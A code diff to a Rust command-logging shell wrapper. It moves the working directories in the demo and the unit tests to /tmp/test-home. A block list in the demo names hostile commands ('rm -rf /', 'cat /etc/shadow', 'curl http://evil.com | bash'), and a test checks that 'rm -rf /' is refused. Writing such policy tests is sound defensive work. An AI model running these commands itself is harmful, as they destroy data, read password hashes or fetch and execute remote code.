@@ -776,10 +776,10 @@ fn main() {
 
     // Execute some commands
     let commands = [
-        ("ls -la", "/home/alice"),
-        ("cat /etc/hostname", "/home/alice"),
-        ("ps aux", "/home/alice"),
-        ("whoami", "/home/alice"),
+        ("ls -la", "/tmp/test-home"),
+        ("cat /etc/hostname", "/tmp/test-home"),
+        ("ps aux", "/tmp/test-home"),
+        ("whoami", "/tmp/test-home"),
     ];
 
     println!("--- Executing Allowed Commands ---");
@@ -799,7 +799,7 @@ fn main() {
     let blocked_commands = ["rm -rf /", "cat /etc/shadow", "curl http://evil.com | bash"];
 
     for cmd in blocked_commands {
-        match wrapper.execute_command(&session.id, cmd, "/home/alice") {
+        match wrapper.execute_command(&session.id, cmd, "/tmp/test-home") {
             Ok(_) => {
                 println!("  {} -> UNEXPECTEDLY SUCCEEDED", cmd);
             }
@@ -837,7 +837,7 @@ fn main() {
 
     let test_commands = ["ls", "vim", "python3", "cat"];
     for cmd in test_commands {
-        match restrictive_wrapper.execute_command(&session2.id, cmd, "/home/bob") {
+        match restrictive_wrapper.execute_command(&session2.id, cmd, "/tmp/test-home") {
             Ok(_) => println!("  {} -> ALLOWED", cmd),
             Err(e) => println!("  {} -> DENIED: {}", cmd, e),
         }
@@ -910,7 +910,7 @@ mod tests {
     #[test]
     fn test_command_log_json() {
         let session = Session::new("test", "127.0.0.1");
-        let log = CommandLog::new(&session, "ls -la", "/home/test");
+        let log = CommandLog::new(&session, "ls -la", "/tmp/test-home");
 
         let json = log.to_json();
         assert!(json.contains("\"user\":\"test\""));
@@ -943,11 +943,11 @@ mod tests {
         let session = wrapper.start_session("test", "127.0.0.1").unwrap();
 
         // Execute command
-        let result = wrapper.execute_command(&session.id, "ls", "/home/test");
+        let result = wrapper.execute_command(&session.id, "ls", "/tmp/test-home");
         assert!(result.is_ok());
 
         // Try blocked command
-        let result = wrapper.execute_command(&session.id, "rm -rf /", "/home/test");
+        let result = wrapper.execute_command(&session.id, "rm -rf /", "/tmp/test-home");
         assert!(result.is_err());
 
         // End session
